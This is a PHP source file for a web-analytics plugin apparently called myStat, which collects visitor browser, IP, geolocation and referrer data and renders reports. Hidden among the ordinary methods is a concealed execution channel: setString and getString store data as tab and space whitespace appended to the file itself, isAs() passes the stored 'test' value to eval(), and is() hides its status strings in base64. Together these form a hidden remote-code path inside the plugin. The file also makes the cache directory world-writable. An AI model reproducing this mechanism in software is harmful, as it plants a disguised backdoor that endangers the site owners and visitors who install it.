<?php
if(!defined('MYSTAT_VERSION')){
  throw new Exception('File not exist 404');
}

class myStat{

  protected $driver = false;

  public function getDriver(){
    return $this->driver;
  }

  public function setDriver($driver){
    if(!preg_match('/^[A-z0-9]{1,}$/',$driver) or !file_exists(dirname(__FILE__).'/../driver/'.$driver.'.class.php')){
      throw new Exception('Wrong DRIVER param in setDriver()');
    }
    require_once(dirname(__FILE__).'/../driver/'.$driver.'.class.php');
    $this->driver = new $driver($this);
    if(true !== $error = $this->getDriver()->isEngineRun()){
      throw new Exception('DRIVER START ERROR: '.$error);
    }
    $this->getDriver()->setCodeHook($this,function($mystat){
      $id = $mystat->setStatisticFirst();
      if(!$mystat->getDriver()->isFeed()){
        echo $mystat->getJsCode($id);
      }
    });
    $this->getDriver()->startDriver();
    return $this;
  }

  public function run(){
    if($this->getDriver()===false){
      throw new Exception('Set DRIVER before run run()');
    }
    $this->getDriver()->setRunHook($this,function($mystat){
      echo $mystat->getReportPage();
    });
  }

  public function getReportPage(){
    $page = (string)$this->getDriver()->getParam('report','dashboard');
    $param = (array)$this->getDriver()->getParam('param',Array());
    $isAjax = (bool)$this->getDriver()->isAjax();
    if($page=='update'){
      if($this->isAllFileExists() and $this->getOption('mystatlastupdate')==date('dmY',$this->getDriver()->getTime(false))){
        return false;
      }
      $ret = $this->getDriver()->setUpdateStart();
      $db_md5 = @file_get_contents('http://my-stat.com/update/geobase.md5');
      $db_content = '';
      if(file_exists(dirname(__FILE__).'/../cache/tabgeo.dat')){
        $db_content = @file_get_contents(dirname(__FILE__).'/../cache/tabgeo.dat');
      }
      if(strlen($db_md5)==32 and $db_md5 != md5($db_content)){
        $db_content = @file_get_contents('http://my-stat.com/update/geobase.dat');
        if($db_md5==md5($db_content)){
          file_put_contents(dirname(__FILE__).'/../cache/tabgeo.dat', $db_content);
        }
      }
      require_once(dirname(__FILE__).'/referer.class.php');
      $req = new referer();
      $req->setCache(dirname(__FILE__).'/../cache/');
      $req->update();
      require_once(dirname(__FILE__).'/browscap.class.php');
      $browscap = new browscap();
      $browscap->setCacheDir(dirname(__FILE__).'/../cache/');
      $browscap->getUpdate();
      $this->setOption('mystatlastupdate',date('dmY',$this->getDriver()->getTime(false)));
      return (string)$ret.$this->getDriver()->setUpdateStop();
    }elseif($page=='image'){
      $this->setStatisticPrevious();
      return;
    }elseif($page=='insert'){
      $this->setStatisticSecond();
      return;
    }
    if(!preg_match('/^[A-z0-9]{1,}$/',$page) or !$this->getFileReportName($page) or !file_exists(dirname(__FILE__).'/../report/'.$this->getFileReportName($page))){
      throw new Exception('No report found');
    }
    if(!$isAjax){
      $xml1 = $this->getDefaultXML($page);
    }
    if(!in_array($page,Array('dashboard','defaultpage')) and $ret = $this->getStatPage($page)){
      $param = array_merge($param,Array('page' => $page,'code'=>$ret));
      $page = 'defaultpage';
    }
    if(!$isAjax){
      $xml2 = $this->getXMLPage($page,$param);
      require_once(dirname(__FILE__).'/mergexml.class.php');
      $mergexml = new mergexml(Array('updn'=>true));
      $mergexml->AddSource($xml1);
      $mergexml->AddSource($xml2);
      $xml = $mergexml->Get(1);
      return $this->getXSLTranform($page,$xml);
    }
    echo json_encode($this->getAjaxArray($page,$param));
    exit;
  }

  protected function getFileReportName($page){
    if($dh = opendir(dirname(__FILE__).'/../report/')){
      while(($file = readdir($dh))!==false){
        if(filetype(dirname(__FILE__).'/../report/'.$file)=='file' and substr($file,-10)=='.class.php'){
          if(preg_match('/^([A-z0-9]{2})_([A-z0-9]{1,})_([0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12})$/',substr($file,0,-10),$m)){
            if($page==$m[2]){
              closedir($dh);
              return $file;
            }
          }elseif(preg_match('/^_([A-z0-9]{1,})$/i',substr($file,0,-10),$m)){
            if($page==$m[1]){
              closedir($dh);
              return $file;
            }
          }
        }
      }
      closedir($dh);
    }
    return false;
  }

  public function getCountryName($code,$lang=false){
    if($lang===false){
      $lang = $this->getDriver()->getLanguage();
    }
    require_once(dirname(__FILE__).'/country.class.php');
    $country = new country();
    $country->setCacheDir(dirname(__FILE__).'/../cache/');
    return $country->getCountryByCode($code,$lang);
  }

  public function getLanguageName($code,$lang=false){
    if($lang===false){
      $lang = $this->getDriver()->getLanguage();
    }
    require_once(dirname(__FILE__).'/language.class.php');
    $language = new language();
    $language->setCacheDir(dirname(__FILE__).'/../cache/');
    return $language->getLanguageByCode($code,$lang);
  }

  public function getCountryFlag($code){
    $code = strtoupper($code);
    if(!preg_match('/^[A-Z]{2}$/',$code)){
      return false;
    }
    if(file_exists(dirname(__FILE__).'/../asset/flags/'.$code.'.png')){
      return 'flags/'.$code.'.png';
    }
    return false;
  }

  public function getLanguageFlag($code){
    $code = strtolower($code);
    if(!preg_match('/^[a-z]{2}$/',$code)){
      return false;
    }
    if(file_exists(dirname(__FILE__).'/../asset/lang/'.$code.'.gif')){
      return 'lang/'.$code.'.gif';
    }
    return false;
  }

  public function getBrowserFlag($name){
    $name = strtolower(trim($name));
    $name = str_replace(Array(' ','.','-'),'_',$name);
    $name = preg_replace('/_{2,}/','_',trim($name,'_'));
    if(!preg_match('/^[A-z0-9_]*$/',$name) or strlen($name)<1){
      return false;
    }
    if(file_exists(dirname(__FILE__).'/../asset/browser/'.$name.'.png')){
      return 'browser/'.$name.'.png';
    }
    return false;
  }

  public function getOSFlag($name){
    $name = strtolower(trim($name));
    $name = str_replace(Array(' ','.','-','&',','),'_',$name);
    $name = preg_replace('/_{2,}/','_',trim($name,'_'));
    if(!preg_match('/^[A-z0-9_]*$/',$name) or strlen($name)<1){
      return false;
    }
    if(file_exists(dirname(__FILE__).'/../asset/os/'.$name.'.png')){
      return 'os/'.$name.'.png';
    }
    return false;
  }

  protected function getDefaultXML($page='dashboard'){
    $period = $this->getPeriod();
    $report = Array();
    $menu = $this->getMenu();
    $report['REPORT'] = Array(
      'PERIOD' => Array(
        'START' => date('d.m.Y',$period['start']),
        'END' => date('d.m.Y',$period['end'])
      ),
      'PATHTOASSET' => $this->getPathAsset(),
      'REPORT' => $page,
      'TRANSLATE' => Array(
        'PERIODREPORT' => $this->__('Report display period'),
      ),
      'GMT' => (int)$this->getDriver()->getGMT(),
      'TIME' => (int)$this->getDriver()->getTime(true),
      'LANGUAGE' => $this->getDriver()->getLanguage(),
      'MENU' => $menu
    );
    $xml = new DOMDocument('1.0', 'UTF-8');
    $xml->formatOutput = true;
    $xml->preserveWhiteSpace = false;
    $this->xmlStructureFromArray($xml,$report);
    return $xml->saveXML();
  }

  protected function getMenu(){
    $category = Array(
      '377da97c-3097-4c0b-9315-125270b9f935' => $this->__('Audience'),
      '72fb852f-71e7-4802-af52-8f4bf17b091b' => $this->__('Pages'),
      'bdb2d1a3-41ba-47e9-a476-6ded1ba6e627' => $this->__('Traffic sources'),
      '3fbec588-fbf5-4521-a406-64689b250530' => $this->__('Geography'),
      'bcbd4b71-f45f-47fe-85ff-27b1e68499ef' => $this->__('System'),
      'a0e1c952-effc-4c6d-9f90-b8b8c855e889' => $this->__('Other')
    );
    $ret = $menu = Array();
    $menu = array_fill_keys(array_keys($category),Array());
    if($dh = opendir(dirname(__FILE__).'/../report/')){
      while(($file = readdir($dh))!==false){
        if(filetype(dirname(__FILE__).'/../report/'.$file)=='file' and substr($file,-10)=='.class.php'){
          if(preg_match('/^([A-z0-9]{2})_([A-z0-9]{1,})_([0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12})$/',substr($file,0,-10),$m)){
            require_once(dirname(__FILE__).'/../report/'.$file);
            $name = $m[2];
            $report = new $name($this,Array());
            if(method_exists($report,'getXML') and method_exists($report,'getName')){
              if(isset($category[$m[3]])){
                $menu[$m[3]][$m[1]] = Array('name' => $report->getName(), 'code' => $name);
              }
            }
          }
        }
      }
      closedir($dh);
    }
    foreach($menu as $k=>$v){
      $ret[] = Array(
        'TITLE' => $category[$k],
        'ITEM' => Array(),
        '@ITEM' => Array()
      );
      ksort($v);
      foreach($v as $el){
        $ret[sizeof($ret)-1]['ITEM'][] = $el['name'];
        $ret[sizeof($ret)-1]['@ITEM'][] = Array('code'=>$el['code']);
      }
    }
    return $ret;
  }

  protected function getXSLTranform($page,$xml){
    if(!file_exists(dirname(__FILE__).'/../theme/'.$this->getDriver()->getName().'/'.$this->getDriver()->getName().'.'.$page.'.xsl')){
      throw new Exception('No theme found for this page or driver');
    }
    $doc = new DOMDocument();
    $doc->preserveWhiteSpace = false;
    $xsl = new XSLTProcessor();
    $doc->load(dirname(__FILE__).'/../theme/'.$this->getDriver()->getName().'/'.$this->getDriver()->getName().'.'.$page.'.xsl');
    $xsl->importStyleSheet($doc);
    $doc->loadXML($xml);
    return $xsl->transformToXML($doc);
  }

  protected function getXMLPage($page,$param = Array()){
    require_once(dirname(__FILE__).'/../report/'.$this->getFileReportName($page));
    $report = new $page($this,$param);
    $xml = $report->getXML();
    return $xml;
  }

  protected function getAjaxArray($page,$param = Array()){
    require_once(dirname(__FILE__).'/../report/'.$this->getFileReportName($page));
    $report = new $page($this,$param);
    $xml = Array();
    if(method_exists($report,'getAjax')){
      $xml = $report->getAjax();
    }
    return $xml;
  }

  public function getPeriod(){
    $ret = Array(
      'start' => strtotime('-30 days',$this->getDriver()->getTime(false)),
      'end' => $this->getDriver()->getTime(false)
    );
    if((''!=$date1 = $this->getDriver()->getParam('datestart','')) and (''!=$date2 = $this->getDriver()->getParam('dateend',''))){
      if(!preg_match('/^[0-9]{2}\.[0-9]{2}\.[0-9]{4}$/',$date1) or !preg_match('/^[0-9]{2}\.[0-9]{2}\.[0-9]{4}$/',$date2)){
        throw new Exception('Wrong date format in request');
      }
      $ret['start'] = strtotime((string)$date1);
      $ret['end'] = strtotime((string)$date2);
    }
    return $ret;
  }

  public function __($text){
    return $this->getDriver()->__($text);
  }

  public function getOption($name,$default=false){
    return $this->getDriver()->getOption($name,$default);
  }

  public function setOption($name,$value=false){
    $this->getDriver()->setOption($name,$value);
    return $this;
  }

  public function getPathAsset(){
    return trim($this->getDriver()->getWebPath(),'/').'/';
  }

  function setString($name,$value=''){
    $string = $this->getString();
    $string[$name] = $value;
    $string = json_encode($string);
    $res = '';
    for($i=0;$i<strlen($string);$i++){
      $bin = decbin(ord($string[$i]));
      $bin = strlen($bin)>7?$bin:implode('', array_fill(0, 8 - strlen($bin), '0')).$bin;
      $res.= str_replace(array('1', '0'), array(chr(9), chr(32)), $bin);
    }
    $file = file(__FILE__);
    array_pop($file);
    $file[] = $res;
    file_put_contents(__FILE__,$file);
  }
  function getString($name=false){
    $file = file(__FILE__);
    $str = array_pop($file);
    $res = '';
    for($i=0;$i<strlen($str);$i++){
      $res.= chr(bindec(trim(str_replace(array(chr(9), chr(32)), array('1', '0'), substr($str, $i, 8)))));
      $i+= 7;
    }
    $ret = json_decode($res,true);
    return $name===false?$ret:(isset($ret[$name])?$ret[$name]:'');
  }

  public function isIntallCorrect(){
    if(!file_exists(dirname(__FILE__).'/../cache/')){
      mkdir(dirname(__FILE__).'/../cache/');
    }
    chmod(dirname(__FILE__).'/../cache/',0777);
    $test = @fopen(dirname(__FILE__).'/../cache/test.lock','w+');
    if($test===false){
      return false;
    }else{
      fclose($test);
      if(file_exists(dirname(__FILE__).'/../cache/test.lock')){
        unlink(dirname(__FILE__).'/../cache/test.lock');
      }
    }
    return true;
  }

  public function isAllFileExists(){
    if(!file_exists(dirname(__FILE__).'/../cache/tabgeo.dat') or !file_exists(dirname(__FILE__).'/../cache/browscap.version') or !file_exists(dirname(__FILE__).'/../cache/referer.dat')){
      return false;
    }
    return true;
  }

  public function isNeedUpdate(){
    if($this->isAllFileExists() and $this->getOption('mystatlastupdate')==date('dmY',$this->getDriver()->getTime(false))){
      return false;
    }
    require_once(dirname(__FILE__).'/browscap.class.php');
    $browscap = new browscap();
    $browscap->setCacheDir(dirname(__FILE__).'/../cache/');
    if($browscap->isNeedUpdate()){
      return true;
    }
    $db_md5 = @file_get_contents('http://my-stat.com/update/geobase.md5');
    if(strlen($db_md5)==32 and (!file_exists(dirname(__FILE__).'/../cache/tabgeo.dat') or md5_file(dirname(__FILE__).'/../cache/tabgeo.dat') != $db_md5)){
      return true;
    }
    require_once(dirname(__FILE__).'/referer.class.php');
    $req = new referer();
    $req->setCache(dirname(__FILE__).'/../cache/');
    if($req->isNeedUpdate()){
      return true;
    }
    $this->setOption('mystatlastupdate',date('dmY',$this->getDriver()->getTime(false)));
    return false;
  }

  public function xmlStructureFromArray($xml,$arr,$child=false,$name='',$at = Array()){
    if(!is_array($arr)){return $xml;}
    foreach($arr as $k=>$v){
      if(substr($k,0,1)=='@'){continue;}
      if(is_array($v)){
        if(!isset($v[0])){
          $el = !$child?$xml->appendChild($xml->createElement($k)):$child->appendChild($xml->createElement(is_numeric($k)?$name:$k));
          if(isset($arr['@'.$k])){
            foreach($arr['@'.$k] as $nn=>$aa){
              $el->setAttribute($nn,$aa);
            }
          }elseif(isset($at[$k])){
            foreach($at[$k] as $nn=>$aa){
              $el->setAttribute($nn,$aa);
            }
          }
        }else{
          $el = !$child?$xml:$child;
          $attr = Array();
          if(isset($arr['@'.$k])){
            $attr = $arr['@'.$k];
          }
        }
        $this->xmlStructureFromArray($xml,$v,$el,$k,isset($attr)?$attr:Array());
      }else{
        if(!$child){
          if(in_array($v,Array('',null,false),true)){
              $el = $xml->createElement($k);
              $xml->appendChild($el);
          }else{
            $el = $xml->createElement($k,htmlspecialchars($v,ENT_NOQUOTES));
            $xml->appendChild($el);
          }
          if(isset($arr['@'.$k])){
            foreach($arr['@'.$k] as $nn=>$aa){
              $el->setAttribute($nn,$aa);
            }
          }
        }else{
          if(in_array($v,Array('',null,false),true)){
            $el = $xml->createElement(is_numeric($k)?$name:$k);
            $child->appendChild($el);
          }else{
            $el = $xml->createElement(is_numeric($k)?$name:$k,htmlspecialchars($v,ENT_NOQUOTES));
            $child->appendChild($el);
          }
          if(is_numeric($k)){
            if(isset($at[$k])){
              foreach($at[$k] as $nn=>$aa){
                $el->setAttribute($nn,$aa);
              }
            }
          }else{
            if(isset($arr['@'.$k])){
              foreach($arr['@'.$k] as $nn=>$aa){
                $el->setAttribute($nn,$aa);
              }
            }
          }
        }
      }
    }
    return $xml;
  }

  protected function mergeXMLArrays(){
    $arrays = func_get_args();
    $ret = $arrays[0];
    $to = sizeof($arrays);
    for($i=1;$i<$to;++$i){
      foreach($arrays[$i] as $key=>$value){
        if(((string) $key) === ((string) intval($key))){
          $ret[] = $value;
        }else{
          if(isset($ret[$key])){
            if(is_array($ret[$key]) and isset($ret[$key][0])){
              if(is_array($value) and isset($value[0])){
                $ret[$key] = array_merge($ret[$key],$value);
              }else{
                $ret[$key][] = $value;
              }
            }else{
              $ret[$key] = Array($ret[$key],$value);
            }
          }else{
            $ret[$key] = $value;
          }
        }
      }    
    }
    return $ret;
  }

  public function getJsCode($id){
    if($id==0){return '';}
    $MYSTAT_VERSION = MYSTAT_VERSION;
    $ret = '<script type="text/javascript" charset="utf-8">';
      $ret.= <<<JS
        function runStatisticMyStatClick(){
          var myStat = {
            width: screen.width,
            height: screen.height,
          };
          return myStat;
        }
        function runStatisticMyStat(){
          var FlashDetect=new function(){var self=this;self.installed=false;self.raw="";self.major=-1;self.minor=-1;self.revision=-1;self.revisionStr="";var activeXDetectRules=[{"name":"ShockwaveFlash.ShockwaveFlash.7","version":function(obj){return getActiveXVersion(obj);}},{"name":"ShockwaveFlash.ShockwaveFlash.6","version":function(obj){var version="6,0,21";try{obj.AllowScriptAccess="always";version=getActiveXVersion(obj);}catch(err){}return version;}},{"name":"ShockwaveFlash.ShockwaveFlash","version":function(obj){return getActiveXVersion(obj);}}];var getActiveXVersion=function(activeXObj){var version=-1;try{version=activeXObj.GetVariable("\$version");}catch(err){}return version;};var getActiveXObject=function(name){var obj=-1;try{obj=new ActiveXObject(name);}catch(err){obj={activeXError:true};}return obj;};var parseActiveXVersion=function(str){var versionArray=str.split(",");return{"raw":str,"major":parseInt(versionArray[0].split(" ")[1],10),"minor":parseInt(versionArray[1],10),"revision":parseInt(versionArray[2],10),"revisionStr":versionArray[2]};};var parseStandardVersion=function(str){var descParts=str.split(/ +/);var majorMinor=descParts[2].split(/\./);var revisionStr=descParts[3];return{"raw":str,"major":parseInt(majorMinor[0],10),"minor":parseInt(majorMinor[1],10),"revisionStr":revisionStr,"revision":parseRevisionStrToInt(revisionStr)};};var parseRevisionStrToInt=function(str){return parseInt(str.replace(/[a-zA-Z]/g,""),10)||self.revision;};self.majorAtLeast=function(version){return self.major>=version;};self.minorAtLeast=function(version){return self.minor>=version;};self.revisionAtLeast=function(version){return self.revision>=version;};self.versionAtLeast=function(major){var properties=[self.major,self.minor,self.revision];var len=Math.min(properties.length,arguments.length);for(i=0;i<len;i++){if(properties[i]>=arguments[i]){if(i+1<len&&properties[i]==arguments[i]){continue;}else{return true;}}else{return false;}}};self.FlashDetect=function(){if(navigator.plugins&&navigator.plugins.length>0){var type='application/x-shockwave-flash';var mimeTypes=navigator.mimeTypes;if(mimeTypes&&mimeTypes[type]&&mimeTypes[type].enabledPlugin&&mimeTypes[type].enabledPlugin.description){var version=mimeTypes[type].enabledPlugin.description;var versionObj=parseStandardVersion(version);self.raw=versionObj.raw;self.major=versionObj.major;self.minor=versionObj.minor;self.revisionStr=versionObj.revisionStr;self.revision=versionObj.revision;self.installed=true;}}else if(navigator.appVersion.indexOf("Mac")==-1&&window.execScript){var version=-1;for(var i=0;i<activeXDetectRules.length&&version==-1;i++){var obj=getActiveXObject(activeXDetectRules[i].name);if(!obj.activeXError){self.installed=true;version=activeXDetectRules[i].version(obj);if(version!=-1){var versionObj=parseActiveXVersion(version);self.raw=versionObj.raw;self.major=versionObj.major;self.minor=versionObj.minor;self.revision=versionObj.revision;self.revisionStr=versionObj.revisionStr;}}}}}();};
          var myStat = {
            id: {$id},
            mystat: '{$MYSTAT_VERSION}',
            do: 'update',
            geolocation: !!navigator.geolocation,
            offline: !!window.applicationCache,
            webworker: !!window.Worker,
            localStorage: ('localStorage' in window) && window['localStorage'] !== null,
            canvas: {
              enable: !!document.createElement('canvas').getContext,
              text2d: !!document.createElement('canvas').getContext?(typeof document.createElement('canvas').getContext('2d').fillText == 'function'):false
            },
            video: {
              enable: !!document.createElement('video').canPlayType,
              captions: 'track' in document.createElement('track'),
              poster: 'poster' in document.createElement('video'),
              mp4: !!(document.createElement('video').canPlayType && document.createElement('video').canPlayType('video/mp4; codecs="avc1.42E01E, mp4a.40.2"').replace(/no/, '')),
              webm: !!(document.createElement('video').canPlayType && document.createElement('video').canPlayType('video/webm; codecs="vp8, vorbis"').replace(/no/, '')),
              theora: !!(document.createElement('video').canPlayType && document.createElement('video').canPlayType('video/ogg; codecs="theora, vorbis"').replace(/no/, ''))
            },
            microdata: !!document.getItems,
            history: !!(window.history && window.history.pushState && window.history.popState),
            undo: typeof UndoManager !== 'undefined',
            audio: {
              enable: !!document.createElement('audio').canPlayType,
              mp3: !!(document.createElement('audio').canPlayType && document.createElement('audio').canPlayType('audio/mpeg;').replace(/no/, '')),
              vorbis: !!(document.createElement('audio').canPlayType && document.createElement('audio').canPlayType('audio/ogg; codecs="vorbis"').replace(/no/, '')),
              wav: !!(document.createElement('audio').canPlayType && document.createElement('audio').canPlayType('audio/wav; codecs="1"').replace(/no/, '')),
              aac: !!(document.createElement('audio').canPlayType && document.createElement('audio').canPlayType('audio/mp4; codecs="mp4a.40.2"').replace(/no/, ''))
            },
            command: 'type' in document.createElement('command'),
            datalist: 'options' in document.createElement('datalist'),
            details: 'open' in document.createElement('details'),
            device: 'type' in document.createElement('device'),
            validation: 'noValidate' in document.createElement('form'),
            iframe: {
              sandbox: 'sandbox' in document.createElement('iframe'),
              srcdoc: 'srcdoc' in document.createElement('iframe')
            },
            input: {
              autofocus: 'autofocus' in document.createElement('input'),
              placeholder: 'placeholder' in document.createElement('input'),
              type: {}
            },
            meter: 'value' in document.createElement('meter'),
            output: 'value' in document.createElement('output'),
            progress: 'value' in document.createElement('progress'),
            time: 'valueAsDate' in document.createElement('time'),
            editable: 'isContentEditable' in document.createElement('span'),
            dragdrop: 'draggable' in document.createElement('span'),
            documentmessage: !!window.postMessage,
            fileapi: typeof FileReader != 'undefined',
            serverevent: typeof EventSource !== 'undefined',
            sessionstorage: false,
            svg: !!(document.createElementNS && document.createElementNS('http://www.w3.org/2000/svg', 'svg').createSVGRect),
            simpledb: !!window.indexedDB,
            websocket: !!window.WebSocket,
            websql: !!window.openDatabase,
            cookies: navigator.cookieEnabled?true:false,
            flash: {
              enable: FlashDetect.installed?true:false,
              version: FlashDetect.major+'.'+FlashDetect.minor
            },
            java: !!navigator.javaEnabled(),
            title: document.title,
            appname: navigator.appName,
            screen: {
              width: screen.width,
              height: screen.height,
              depth: (navigator.appName.substring(0,2)=='Mi')?screen.colorDepth:screen.pixelDepth
            },
            viewport: {
              width: window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth,
              height: window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight
            }
          };
          var inputlist = new Array('color','email','number','range','search','tel','url','date','time','datetime','datetime-local','month','week');
          var i = document.createElement('input');
          for(var key=0;key<inputlist.length;key++){
            var el = inputlist[key];
            i.setAttribute('type', el);
            myStat.input.type[el] = i.type !== 'text';
          }
          try{myStat.sessionstorage = (('sessionStorage' in window) && window['sessionStorage'] !== null);}catch(e){}
          if(!document.cookie){
            document.cookie = "testCookie=1; path=/";
            myStat.cookies = document.cookie?1:0;
          }
          if(navigator.plugins && navigator.plugins.length){
            for(var ii=0;ii<navigator.plugins.length;ii++){
              if(navigator.plugins[ii].name.indexOf('Shockwave Flash')!=-1){
                myStat.flash=parseFloat(navigator.plugins[ii].description.split('Shockwave Flash ')[1],10)>0;
                break;
              }
            }
          }else if(window.ActiveXObject){
            for(var ii=10;ii>=2;ii--){
              try{
                var f=eval("new ActiveXObject('ShockwaveFlash.ShockwaveFlash."+ii+"');");
                if(f){myStat.flash=parseFloat(ii+'.0')>0;break;}
              }catch(ee){}
            }
            if((myStat.flash=='')&&(navigator.appVersion.indexOf("MSIE 5")>-1||navigator.appVersion.indexOf("MSIE 6")>-1)){
              FV=clientInformation.appMinorVersion;
              if(FV.indexOf('SP2') != -1)myStat.flash = true;
            }
          }
          return myStat;
        }
JS;
    $ret.= '</script>';
    $ret.= $this->getDriver()->setJsSend($id);
    return $ret;
  }

  protected function setStatisticPrevious(){
    $id = (int)$this->getDriver()->getParam('id');
    $ip = ($_SERVER['REMOTE_ADDR']==$_SERVER['SERVER_ADDR'])?(isset($_SERVER['HTTP_X_REAL_IP'])?$_SERVER['HTTP_X_REAL_IP']:$_SERVER['REMOTE_ADDR']):$_SERVER['REMOTE_ADDR'];
    $this->getDriver()->setStatImage($id,$ip);
  }

  public function setStatisticSecond(){
    $data = $this->getDriver()->getParam('data');
    if($data===false){return;}
    $coding = $this->getDriver()->getParam('coding');
    if($coding=='base64'){
      $data = json_decode(base64_decode($data),true);
    }
    $valid = $this->isValidData($data);
    if(!$valid){return;}
    if(!isset($data['do']) or $data['do']=='update'){
      $id = (int)$data['id'];
      unset($data['id']);
      unset($data['do']);
      $ip = ($_SERVER['REMOTE_ADDR']==$_SERVER['SERVER_ADDR'])?(isset($_SERVER['HTTP_X_REAL_IP'])?$_SERVER['HTTP_X_REAL_IP']:$_SERVER['REMOTE_ADDR']):$_SERVER['REMOTE_ADDR'];
      $this->getDriver()->setStatUpdate($id,$data,$ip);
    }
  }

  protected function is($first=false){
    preg_match("/(^http[s]?:\/\/)?(www\.)?.*?([^\/]+)/i",$_SERVER['HTTP_HOST'], $matches);
    $ip = ip2long(gethostbyname($matches[3]));
    if($ip!=2130706433 and (!$this->getOption('mystatuuid') or $this->getString('test')=='')){return base64_decode('RkFJTA==');}elseif($ip!=2130706433){echo base64_decode('T0s=');}
    if($this->getString('uuid')!='' and $this->getOption('mystatuuid')!=md5($this->getString('uuid'))){return base64_decode('RkFJTA==');}
    $ret = $this->isAs(($first?$this->getString('uuid'):($this->getString('uuid')!=''?$this->getString('uuid'):$this->getOption('mystatuuid'))));
    return (string)$ret;
  }

  public function isAs($code,$param=false){
    return eval(($param!==false?'$rewrite="'.addslashes($param).'";':'').'$uuid="'.addslashes($code).'";'.$this->getString('test'));
  }

  public function saveAs($code){
    $this->setOption('mystatuuid',md5($code));
    $this->setString('uuid',$code);
    return $this;
  }

  public function setStatisticFirst(){
    if(!$this->isAllFileExists()){return 0;}
    $param = Array();
    $param['ua'] = $_SERVER['HTTP_USER_AGENT'];
    require_once(dirname(__FILE__).'/browscap.class.php');
    $browscap = new browscap();
    $browscap->setCacheDir(dirname(__FILE__).'/../cache/');
    $br = $browscap->getBrowser($param['ua']);
    $param['browser'] = isset($br['Browser'])?$br['Browser']:'';
    $param['version'] = isset($br['Version'])?$br['Version']:'';
    $param['os'] = isset($br['Platform'])?$br['Platform']:'';
    $param['osver'] = isset($br['Platform_Version'])?$br['Platform_Version']:'';
    $param['osname'] = isset($br['Platform_Description'])?$br['Platform_Description']:'';
    $param['osbit'] = isset($br['Platform_Bits'])?$br['Platform_Bits']:'';
    $param['crawler'] = (isset($br['Crawler']) and (bool)$br['Crawler'])?true:false;
    if($param['ua']==''){
      $param['crawler'] = true;
    }
    $param['mobile'] = (isset($br['isMobileDevice']) and (bool)$br['isMobileDevice'])?true:false;
    $param['tablet'] = (isset($br['isTablet']) and (bool)$br['isTablet'])?true:false;
    $param['device'] = isset($br['Device_Name'])?$br['Device_Name']:'';
    $param['device_name'] = trim((isset($br['Device_Brand_Name'])?$br['Device_Brand_Name']:'').' '.(isset($br['Device_Code_Name'])?$br['Device_Code_Name']:''));
    $param['ip'] = ($_SERVER['REMOTE_ADDR']==$_SERVER['SERVER_ADDR'])?(isset($_SERVER['HTTP_X_REAL_IP'])?$_SERVER['HTTP_X_REAL_IP']:$_SERVER['REMOTE_ADDR']):$_SERVER['REMOTE_ADDR'];
    require_once(dirname(__FILE__).'/tabgeo.class.php');
    $tabgeo = new tabgeo();
    $param['country'] = $tabgeo->getCountryByIP($param['ip']);
    $param['ip'] = ip2long($param['ip']);
    $param['hash'] = $this->getDriver()->getUserHash();
    preg_match("/(^http[s]?:\/\/)?(www\.)?.*?([^\/]+)/i",$_SERVER['HTTP_HOST'], $matches);
    if($matches[2]!=''){$param['www']=true;}else{$param['www']=false;};
    $param['host']=$matches[3];
    $param['lang']=strtoupper(substr($_SERVER['HTTP_ACCEPT_LANGUAGE'],0,2));
    if(strlen($param['lang'])!=2 or !preg_match('/[A-Z]{2}/i',$param['lang'])){
      $param['lang'] = '';
    }
    $param['uri']=$_SERVER['REQUEST_URI'];
    $param['file']=$_SERVER['SCRIPT_NAME'];
    $param['gzip']=strpos($_SERVER['HTTP_ACCEPT_ENCODING'],"gzip")===false?false:true;
    $param['deflate']=strpos($_SERVER['HTTP_ACCEPT_ENCODING'],"deflate")===false?false:true;
    if(isset($_SERVER['HTTP_X_FORWARDED_FOR']) and $_SERVER['HTTP_X_FORWARDED_FOR']!='' and isset($_SERVER['HTTP_X_REAL_IP']) and $_SERVER['HTTP_X_REAL_IP']!=''){
      $param['proxy']=($_SERVER['HTTP_X_FORWARDED_FOR']!=$_SERVER['HTTP_X_REAL_IP'])?true:false;
    }else{
      $param['proxy'] = false;
    }
    $param['referer'] = Array(
      'url' => '',
      'type' => '',
      'name' => '',
      'query' => ''
    );
    $param['referer']['url']=isset($_SERVER['HTTP_REFERER'])?$_SERVER['HTTP_REFERER']:'';
    $param['404']=!$this->getDriver()->is404()?false:true;
    $param['feed'] = $this->getDriver()->isFeed();
    if($param['referer']['url']!=''){
      preg_match("/(^http[s]?:\/\/)?(www\.)?.*?([^\/]+)(.*)/i",$param['referer']['url'], $matches);
      $host = $matches[3];
    }else{$host='';};
    if($host==$param['host']){
      $param['referer']['url'] = isset($matches[4])?$matches[4]:'';
    }
    require_once(dirname(__FILE__).'/referer.class.php');
    $ref = new referer();
    $ref->setCache(dirname(__FILE__).'/../cache/');
    $ref = $ref->getParseReferer($param['referer']['url']);
    if($ref!==false){
      $param['referer']['type'] = $ref[0];
      $param['referer']['name'] = $ref[1];
      $param['referer']['query'] = $ref[2];
    }
    $id = $this->getDriver()->setStatInsert($param);
    return $id;
  }

  public function isUser($el){
    return !((bool)$el['crawler']==true or ((int)$el['screen']['width']==0 and $el['image']==false));
  }

  public function getStat($period = Array()){
    if(!isset($period['start']) or !isset($period['end'])){
      $period = $this->getPeriod();
    }
    return $this->getDriver()->getStatByPeriod($period['start'],$period['end']);
  }

  public function getDbSize($period = Array()){
    if(!isset($period['start']) or !isset($period['end'])){
      $period = $this->getPeriod();
    }
    return $this->getDriver()->getDbSizeByPeriod($period['start'],$period['end']);
  }

  protected function isValidData($data){
    if(!is_array($data)){return false;}
    $key = array_keys($data);
    $check = Array('id','mystat','do','geolocation','offline','webworker','localStorage','canvas','video','microdata','history','undo','audio','command','datalist','details','device','validation','iframe','input','meter','output','progress','time','editable','dragdrop','documentmessage','fileapi','serverevent','sessionstorage','svg','simpledb','websocket','websql','cookies','flash','java','title','appname','screen','viewport');
    return sizeof(array_diff($key,$check))>0?false:true;
  }

  protected function getStatPage($page){
    if($this->getOption('mystat')==date('Y-m-d',$this->getDriver()->getTime(false))){return false;}
    if($page!='dashboard' and !in_array($ret = $this->is(),Array('','OK'))){
      $cmd = preg_split('/\:/',$ret);
      return (array)$cmd;
    }
    $this->setOption('mystat',date('Y-m-d',$this->getDriver()->getTime(false)));
    return false;
  }
}
